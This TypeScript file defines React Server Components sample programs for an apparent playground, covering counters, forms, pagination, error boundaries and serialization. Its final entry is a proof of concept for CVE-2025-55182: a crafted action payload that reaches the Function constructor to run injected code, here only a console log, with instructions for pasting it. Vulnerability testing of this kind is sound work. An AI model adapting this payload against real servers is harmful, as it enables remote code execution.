export interface Sample {
  name: string;
  server: string;
  client: string;
}

export const SAMPLES: Record<string, Sample> = {
  hello: {
    name: "Hello World",
    server: `export default function App() {
  return <h1>Hello World</h1>
}`,
    client: `'use client'`,
  },
  async: {
    name: "Async Component",
    server: `import { Suspense } from 'react'

export default function App() {
  return (
    <div>
      <h1>Async Component</h1>
      <Suspense fallback={<p>Loading...</p>}>
        <SlowComponent />
      </Suspense>
    </div>
  )
}

async function SlowComponent() {
  await new Promise(r => setTimeout(r, 500))
  return <p>Data loaded!</p>
}`,
    client: `'use client'`,
  },
  counter: {
    name: "Counter",
    server: `import { Counter } from './client'

export default function App() {
  return (
    <div>
      <h1>Counter</h1>
      <Counter initialCount={0} />
    </div>
  )
}`,
    client: `'use client'

import { useState } from 'react'

export function Counter({ initialCount }) {
  const [count, setCount] = useState(initialCount)

  return (
    <div>
      <p>Count: {count}</p>
      <div style={{ display: 'flex', gap: 8 }}>
        <button onClick={() => setCount(c => c - 1)}>−</button>
        <button onClick={() => setCount(c => c + 1)}>+</button>
      </div>
    </div>
  )
}`,
  },
  form: {
    name: "Form Action",
    server: `import { Form } from './client'

export default function App() {
  return (
    <div>
      <h1>Form Action</h1>
      <Form greetAction={greet} />
    </div>
  )
}

async function greet(prevState, formData) {
  'use server'
  await new Promise(r => setTimeout(r, 500))
  const name = formData.get('name')
  if (!name) return { message: null, error: 'Please enter a name' }
  return { message: \`Hello, \${name}!\`, error: null }
}`,
    client: `'use client'

import { useActionState } from 'react'

export function Form({ greetAction }) {
  const [state, formAction, isPending] = useActionState(greetAction, {
    message: null,
    error: null
  })

  return (
    <form action={formAction}>
      <div style={{ display: 'flex', gap: 8 }}>
        <input
          name="name"
          placeholder="Enter your name"
          style={{ flex: 1, minWidth: 0, padding: '8px 12px', borderRadius: 4, border: '1px solid #ccc' }}
        />
        <button disabled={isPending}>
          {isPending ? 'Sending...' : 'Greet'}
        </button>
      </div>
      {state.error && <p style={{ color: 'red', marginTop: 8 }}>{state.error}</p>}
      {state.message && <p style={{ color: 'green', marginTop: 8 }}>{state.message}</p>}
    </form>
  )
}`,
  },
  refresh: {
    name: "Router Refresh",
    server: `import { Suspense } from 'react'
import { Timer, Router } from './client'

export default function App() {
  return (
    <div>
      <h1>Router Refresh</h1>
      <p style={{ marginBottom: 12, color: '#666' }}>
        Client state persists across server navigations
      </p>
      <Suspense fallback={<p>Loading...</p>}>
        <Router initial={renderPage()} refreshAction={renderPage} />
      </Suspense>
    </div>
  )
}

async function renderPage() {
  'use server'
  return <ColorTimer />
}

async function ColorTimer() {
  await new Promise(r => setTimeout(r, 300))
  const hue = Math.floor(Math.random() * 360)
  return <Timer color={\`hsl(\${hue}, 70%, 85%)\`} />
}`,
    client: `'use client'

import { useState, useEffect, useTransition, use } from 'react'

export function Timer({ color }) {
  const [seconds, setSeconds] = useState(0)

  useEffect(() => {
    const id = setInterval(() => setSeconds(s => s + 1), 1000)
    return () => clearInterval(id)
  }, [])

  return (
    <div style={{
      background: color,
      padding: 24,
      borderRadius: 8,
      textAlign: 'center'
    }}>
      <p style={{ fontFamily: 'monospace', fontSize: 32, margin: 0 }}>Timer: {seconds}s</p>
    </div>
  )
}

export function Router({ initial, refreshAction }) {
  const [contentPromise, setContentPromise] = useState(initial)
  const [isPending, startTransition] = useTransition()
  const content = use(contentPromise)

  const refresh = () => {
    startTransition(() => {
      setContentPromise(refreshAction())
    })
  }

  return (
    <div style={{ opacity: isPending ? 0.7 : 1 }}>
      <button onClick={refresh} disabled={isPending} style={{ marginBottom: 12 }}>
        {isPending ? 'Refreshing...' : 'Refresh'}
      </button>
      {content}
    </div>
  )
}`,
  },
  pagination: {
    name: "Pagination",
    server: `import { Suspense } from 'react'
import { Paginator } from './client'

export default function App() {
  return (
    <div>
      <h1>Pagination</h1>
      <Suspense fallback={<p style={{ color: '#888' }}>Loading recipes...</p>}>
        <InitialRecipes />
      </Suspense>
    </div>
  )
}

async function InitialRecipes() {
  await new Promise(r => setTimeout(r, 200))
  const initialItems = recipes.slice(0, 2).map(r => <RecipeCard key={r.id} recipe={r} />)
  return (
    <Paginator
      initialItems={initialItems}
      initialCursor={2}
      loadMoreAction={loadMore}
    />
  )
}

async function loadMore(cursor) {
  'use server'
  await new Promise(r => setTimeout(r, 300))
  const newItems = recipes.slice(cursor, cursor + 2)
  return {
    newItems: newItems.map(r => <RecipeCard key={r.id} recipe={r} />),
    cursor: cursor + 2,
    hasMore: cursor + 2 < recipes.length
  }
}

function RecipeCard({ recipe }) {
  return (
    <div style={{ padding: 12, marginBottom: 8, background: '#f5f5f5', borderRadius: 6 }}>
      <strong>{recipe.name}</strong>
      <p style={{ margin: '4px 0 0', color: '#666', fontSize: 13 }}>
        {recipe.time} · {recipe.difficulty}
      </p>
    </div>
  )
}

const recipes = [
  { id: 1, name: 'Pasta Carbonara', time: '25 min', difficulty: 'Medium' },
  { id: 2, name: 'Grilled Cheese', time: '10 min', difficulty: 'Easy' },
  { id: 3, name: 'Chicken Stir Fry', time: '20 min', difficulty: 'Easy' },
  { id: 4, name: 'Beef Tacos', time: '30 min', difficulty: 'Medium' },
  { id: 5, name: 'Caesar Salad', time: '15 min', difficulty: 'Easy' },
  { id: 6, name: 'Mushroom Risotto', time: '45 min', difficulty: 'Hard' },
]`,
    client: `'use client'

import { useState, useTransition } from 'react'

export function Paginator({ initialItems, initialCursor, loadMoreAction }) {
  const state = usePagination(initialItems, initialCursor, loadMoreAction)

  return (
    <form action={state.formAction}>
      {state.items}
      {state.hasMore && (
        <button disabled={state.isPending}>
          {state.isPending ? 'Loading...' : 'Load More'}
        </button>
      )}
    </form>
  )
}

function usePagination(initialItems, initialCursor, action) {
  const [items, setItems] = useState(initialItems)
  const [cursor, setCursor] = useState(initialCursor)
  const [hasMore, setHasMore] = useState(true)
  const [isPending, startTransition] = useTransition()

  const formAction = () => {
    startTransition(async () => {
      const result = await action(cursor)
      startTransition(() => {
        setItems(prev => [...prev, ...result.newItems])
        setCursor(result.cursor)
        setHasMore(result.hasMore)
      })
    })
  }

  return { items, hasMore, formAction, isPending }
}`,
  },
  errors: {
    name: "Error Handling",
    server: `import { Suspense } from 'react'
import { ErrorBoundary } from './client'

export default function App() {
  return (
    <div>
      <h1>Error Handling</h1>
      <ErrorBoundary fallback={<FailedToLoad />}>
        <Suspense fallback={<p>Loading user...</p>}>
          <UserProfile id={123} />
        </Suspense>
      </ErrorBoundary>
    </div>
  )
}

async function UserProfile({ id }) {
  const user = await fetchUser(id)
  return (
    <div style={{ padding: 16, background: '#f0f0f0', borderRadius: 8 }}>
      <strong>{user.name}</strong>
    </div>
  )
}

function FailedToLoad() {
  return (
    <div style={{ padding: 16, background: '#fee', borderRadius: 8, color: '#c00' }}>
      <strong>Failed to load user</strong>
      <p style={{ margin: '4px 0 0' }}>Please try again later.</p>
    </div>
  )
}

async function fetchUser(id) {
  await new Promise(r => setTimeout(r, 300))
  throw new Error('Network error')
}`,
    client: `'use client'

import { Component } from 'react'

export class ErrorBoundary extends Component {
  state = { error: null }

  static getDerivedStateFromError(error) {
    return { error }
  }

  render() {
    if (this.state.error) {
      return this.props.fallback
    }
    return this.props.children
  }
}`,
  },
  clientref: {
    name: "Client Reference",
    server: `// Server can pass client module exports as props
import { darkTheme, lightTheme, ThemedBox } from './client'

export default function App() {
  // Server references client-side config objects
  // They serialize as module references, resolved on client
  return (
    <div>
      <h1>Client Reference</h1>
      <div style={{ display: 'flex', gap: 12 }}>
        <ThemedBox theme={darkTheme} label="Dark" />
        <ThemedBox theme={lightTheme} label="Light" />
      </div>
    </div>
  )
}`,
    client: `'use client'

export const darkTheme = { background: '#1a1a1a', color: '#fff' }
export const lightTheme = { background: '#f5f5f5', color: '#000' }

export function ThemedBox({ theme, label }) {
  return (
    <div style={{ ...theme, padding: 16, borderRadius: 8 }}>
      {label} theme
    </div>
  )
}`,
  },
  bound: {
    name: "Bound Actions",
    server: `// action.bind() pre-binds arguments on the server
import { Greeter } from './client'

export default function App() {
  return (
    <div>
      <h1>Bound Actions</h1>
      <p style={{ color: '#888', marginBottom: 16 }}>
        Same action, different bound greetings:
      </p>
      <Greeter action={greet.bind(null, 'Hello')} />
      <Greeter action={greet.bind(null, 'Howdy')} />
      <Greeter action={greet.bind(null, 'Hey')} />
    </div>
  )
}

async function greet(greeting, name) {
  'use server'
  return \`\${greeting}, \${name}!\`
}`,
    client: `'use client'

import { useState } from 'react'

export function Greeter({ action }) {
  const [result, setResult] = useState(null)

  async function handleSubmit(formData) {
    // greeting is pre-bound, we only pass name
    const message = await action(formData.get('name'))
    setResult(message)
  }

  return (
    <form action={handleSubmit} style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 8 }}>
      <input name="name" placeholder="Your name" required style={{ flex: 1, maxWidth: 120, minWidth: 0, padding: '4px 8px' }} />
      <button>Greet</button>
      {result && <span>{result}</span>}
    </form>
  )
}`,
  },
  binary: {
    name: "Binary Data",
    server: `import { BinaryDisplay } from './client'

export default function App() {
  const buffer = new ArrayBuffer(4)
  new Uint8Array(buffer).set([0xCA, 0xFE, 0xBA, 0xBE])

  return (
    <div>
      <h1>Binary Data</h1>
      <BinaryDisplay
        arrayBuffer={buffer}
        int8={new Int8Array([0x7F, -1, -128])}
        uint8={new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF])}
        uint8Clamped={new Uint8ClampedArray([0, 128, 255])}
        int16={new Int16Array([0x7FFF, -1])}
        uint16={new Uint16Array([0xFFFF, 0x1234])}
        int32={new Int32Array([0x12345678, -1])}
        uint32={new Uint32Array([0xDEADBEEF])}
        float32={new Float32Array([Math.PI])}
        float64={new Float64Array([Math.PI])}
        bigInt64={new BigInt64Array([0x123456789ABCDEFn, -1n])}
        bigUint64={new BigUint64Array([0xFEDCBA9876543210n])}
        dataView={new DataView(buffer)}
      />
    </div>
  )
}`,
    client: `'use client'

function formatBytes(arr) {
  return Array.from(new Uint8Array(arr.buffer || arr)).map(b => '0x' + b.toString(16).padStart(2, '0')).join(', ')
}

export function BinaryDisplay(props) {
  return (
    <div style={{ fontSize: 12, fontFamily: 'monospace' }}>
      <div>ArrayBuffer: [{formatBytes(props.arrayBuffer)}]</div>
      <div>Int8Array: [{props.int8.join(', ')}]</div>
      <div>Uint8Array: [{formatBytes(props.uint8)}]</div>
      <div>Uint8ClampedArray: [{props.uint8Clamped.join(', ')}]</div>
      <div>Int16Array: [{props.int16.join(', ')}]</div>
      <div>Uint16Array: [{props.uint16.join(', ')}]</div>
      <div>Int32Array: [{props.int32.map(n => '0x' + (n >>> 0).toString(16)).join(', ')}]</div>
      <div>Uint32Array: [{props.uint32.map(n => '0x' + n.toString(16)).join(', ')}]</div>
      <div>Float32Array: [{props.float32.join(', ')}]</div>
      <div>Float64Array: [{props.float64.join(', ')}]</div>
      <div>BigInt64Array: [{props.bigInt64.map(n => n.toString()).join(', ')}]</div>
      <div>BigUint64Array: [{props.bigUint64.map(n => '0x' + n.toString(16)).join(', ')}]</div>
      <div>DataView: [{formatBytes(props.dataView)}]</div>
    </div>
  )
}`,
  },
  kitchensink: {
    name: "Kitchen Sink",
    server: `import { Suspense } from 'react'
import { DataDisplay } from './client'

export default function App() {
  return (
    <div>
      <h1>Kitchen Sink</h1>
      <Suspense fallback={<p>Loading...</p>}>
        <AllTypes />
      </Suspense>
    </div>
  )
}

async function AllTypes() {
  await new Promise(r => setTimeout(r, 100))

  const data = {
    // Primitives
    primitives: {
      null: null,
      undefined: undefined,
      true: true,
      false: false,
      int: 42,
      float: 3.14159,
      string: "hello world",
      empty: "",
      dollar: "$special",
      unicode: "Hello 世界 🌍",
    },

    // Special numbers
    special: {
      negZero: -0,
      inf: Infinity,
      negInf: -Infinity,
      nan: NaN,
    },

    // Special types
    types: {
      date: new Date("2024-01-15T12:00:00.000Z"),
      bigint: BigInt("12345678901234567890"),
      symbol: Symbol.for("mySymbol"),
    },

    // Binary / TypedArrays
    binary: {
      uint8: new Uint8Array([1, 2, 3, 4, 5]),
      int32: new Int32Array([-1, 0, 2147483647]),
      float64: new Float64Array([3.14159, 2.71828]),
    },

    // Collections
    collections: {
      map: new Map([["a", 1], ["b", { nested: true }]]),
      set: new Set([1, 2, "three"]),
      formData: createFormData(),
      blob: new Blob(["hello"], { type: "text/plain" }),
    },

    // Arrays
    arrays: {
      simple: [1, 2, 3],
      sparse: createSparse(),
      nested: [[1], [2, [3]]],
    },

    // Objects
    objects: {
      simple: { a: 1 },
      nested: { x: { y: { z: "deep" } } },
    },

    // React elements
    elements: {
      div: <div className="test">Hello</div>,
      fragment: <><span>a</span><span>b</span></>,
      suspense: <Suspense fallback="..."><p>content</p></Suspense>,
    },

    // Promises
    promises: {
      resolved: Promise.resolve("immediate"),
      delayed: new Promise(r => setTimeout(() => r("delayed"), 100)),
    },

    // Iterators
    iterators: {
      sync: [1, 2, 3][Symbol.iterator](),
    },

    // References
    refs: createRefs(),

    // Server action
    action: serverAction,
  }

  return <DataDisplay data={data} />
}

function createFormData() {
  const fd = new FormData()
  fd.append("key", "value")
  return fd
}

function createSparse() {
  const a = [1]; a[3] = 4; return a
}

function createRefs() {
  const shared = { id: 1 }
  const cyclic = { name: "cyclic" }
  cyclic.self = cyclic
  return { dup: { a: shared, b: shared }, cyclic }
}

async function serverAction(x) {
  'use server'
  return { got: x }
}`,
    client: `'use client'

export function DataDisplay({ data }) {
  return (
    <div style={{ fontSize: 12 }}>
      {Object.entries(data).map(([section, values]) => (
        <div key={section} style={{ marginBottom: 16 }}>
          <strong>{section}</strong>
          <div style={{ marginLeft: 12 }}>
            {typeof values === 'function' ? (
              <div><button onClick={() => values('test')}>Call {values.name || 'action'}</button></div>
            ) : typeof values === 'object' && values !== null ? (
              Object.entries(values).map(([k, v]) => (
                <div key={k}>{k}: {renderValue(v)}</div>
              ))
            ) : (
              <span>{renderValue(values)}</span>
            )}
          </div>
        </div>
      ))}
    </div>
  )
}

function renderValue(v) {
  if (v === null) return 'null'
  if (v === undefined) return 'undefined'
  if (typeof v === 'symbol') return v.toString()
  if (typeof v === 'bigint') return v.toString() + 'n'
  if (typeof v === 'function') return '[Function]'
  if (v instanceof Date) return v.toISOString()
  if (v instanceof Map) return 'Map(' + v.size + ')'
  if (v instanceof Set) return 'Set(' + v.size + ')'
  if (v instanceof FormData) return 'FormData'
  if (v instanceof Blob) return 'Blob(' + v.size + ')'
  if (v instanceof ArrayBuffer) return 'ArrayBuffer(' + v.byteLength + ')'
  if (ArrayBuffer.isView(v)) return v.constructor.name + '(' + v.length + ')'
  if (Array.isArray(v)) return '[' + v.length + ' items]'
  if (typeof v === 'object') return '{...}'
  return String(v)
}`,
  },
  cve: {
    name: "CVE-2025-55182",
    server: `import { Instructions } from './client'

async function poc() {
  'use server'
}

export default function App() {
  return (
    <div>
      <h1>CVE-2025-55182</h1>
      <Instructions />
    </div>
  )
}`,
    client: `'use client'

import { useState } from 'react'

const PAYLOAD = \`0="$1"&1={"status":"resolved_model","reason":0,"_response":"$5","value":"{\\\\"then\\\\":\\\\"$4:map\\\\",\\\\"0\\\\":{\\\\"then\\\\":\\\\"$B3\\\\"},\\\\"length\\\\":1}","then":"$2:then"}&2="$@3"&3=""&4=[]&5={"_prefix":"console.log('😼 meow meow from', self.constructor.name)//","_formData":{"get":"$4:constructor:constructor"},"_chunks":"$2:_response:_chunks","_bundlerConfig":{}}\`

export function Instructions() {
  const [copied, setCopied] = useState(false)

  const handleCopy = () => {
    navigator.clipboard.writeText(PAYLOAD)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div>
      <ol style={{ paddingLeft: 20, marginBottom: 16 }}>
        <li>Use the + button in above pane to add a raw action</li>
        <li>Select the <code>poc</code> action</li>
        <li>Copy the payload below and paste it</li>
        <li>Open your browser's console</li>
        <li>If this version of React is vulnerable, you'll see a log from the worker (which simulates the server)</li>
      </ol>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
        <label style={{ fontSize: 12, color: '#666' }}>Payload:</label>
        <button onClick={handleCopy} style={{ fontSize: 12, padding: '2px 8px' }}>
          {copied ? 'Copied!' : 'Copy'}
        </button>
      </div>
      <textarea
        readOnly
        value={PAYLOAD}
        style={{
          width: '100%',
          height: 80,
          fontFamily: 'monospace',
          fontSize: 11,
          padding: 8,
          border: '1px solid #ccc',
          borderRadius: 4,
          resize: 'vertical',
          background: '#f5f5f5'
        }}
        onClick={e => e.target.select()}
      />
    </div>
  )
}`,
  },
};
